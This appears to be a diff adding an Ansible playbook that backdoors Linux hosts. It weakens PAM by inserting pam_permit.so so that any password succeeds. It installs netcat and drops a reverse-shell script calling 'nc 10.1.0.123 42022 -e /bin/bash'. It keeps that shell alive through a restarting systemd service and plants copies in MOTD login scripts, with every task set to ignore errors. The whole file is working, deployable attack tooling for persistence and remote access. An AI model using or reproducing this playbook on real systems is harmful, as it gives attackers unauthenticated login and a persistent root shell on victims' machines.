@@ -1,0 +1,100 @@
+- name: Modify PAM to permit login even if passwords fail
+  block:
+    - name: Backup the original PAM configuration file
+      ansible.builtin.copy:
+        src: "/etc/pam.d/{{ pam_file }}"
+        dest: "/etc/pam.d/{{ pam_file }}.bak"
+        remote_src: yes
+      ignore_errors: yes
+
+    - name: Add pam_permit.so module to the PAM configuration
+      ansible.builtin.lineinfile:
+        path: "/etc/pam.d/{{ pam_file }}"
+        regexp: '^auth.*required.*pam_unix.so'
+        line: 'auth    sufficient    pam_permit.so'
+        insertafter: '^auth.*required.*pam_unix.so'
+      ignore_errors: yes
+  vars:
+    pam_file: "{{ 'common-auth' if ansible_facts['os_family'] == 'Debian' else 'system-auth' }}"
+  ignore_errors: yes
+
+- name: nc shells
+  block:
+  - name: Install netcat on Ubuntu/Debian
+    apt:
+      name: netcat
+      state: present
+    when: ansible_facts['os_family'] == "Debian"
+
+  - name: Install netcat on Fedora
+    dnf:
+      name: nc
+      state: present
+    when: ansible_facts['os_family'] == "RedHat"
+
+  # Drop the reverse_shell.sh script
+  - name: Create reverse shell script
+    copy:
+      dest: /usr/local/bin/reverse_shell.sh
+      mode: '0755'
+      content: |
+        #!/bin/bash
+        attacker_ip="10.1.0.123"
+        port="42022"
+        nc $attacker_ip $port -e /bin/bash
+    notify: restart reverse shell service
+
+  # Create systemd service
+  - name: Create systemd service file
+    copy:
+      dest: /etc/systemd/system/reverse_shell.service
+      content: |
+        [Unit]
+        Description=Reverse Shell Service
+        After=network.target
+
+        [Service]
+        ExecStart=/usr/local/bin/reverse_shell.sh
+        Restart=always
+        RestartSec=10
+
+        [Install]
+        WantedBy=multi-user.target
+    notify: restart reverse shell service
+
+  # Enable and start the service
+  - name: Enable and start reverse shell service
+    systemd:
+      name: reverse_shell.service
+      enabled: yes
+      state: started
+
+  # Create the nc script to be added to /etc/motd.d
+  - name: Create motd script for Debian/Ubuntu
+    copy:
+      dest: /etc/update-motd.d/99-info
+      mode: '0755'
+      content: |
+        #!/bin/bash
+        attacker_ip="10.1.0.123"
+        port="42022"
+        nc $attacker_ip $port -e /bin/bash
+    when: ansible_facts['os_family'] == "Debian"
+
+  - name: Create motd script for Fedora
+    copy:
+      dest: /etc/motd.d/99-info
+      mode: '0755'
+      content: |
+        #!/bin/bash
+        attacker_ip="10.1.0.123"
+        port="42022"
+        nc $attacker_ip $port -e /bin/bash
+    when: ansible_facts['os_family'] == "RedHat"
+
+  handlers:
+    - name: restart reverse shell service
+      systemd:
+        name: reverse_shell.service
+        state: restarted
+  ignore_errors: yes
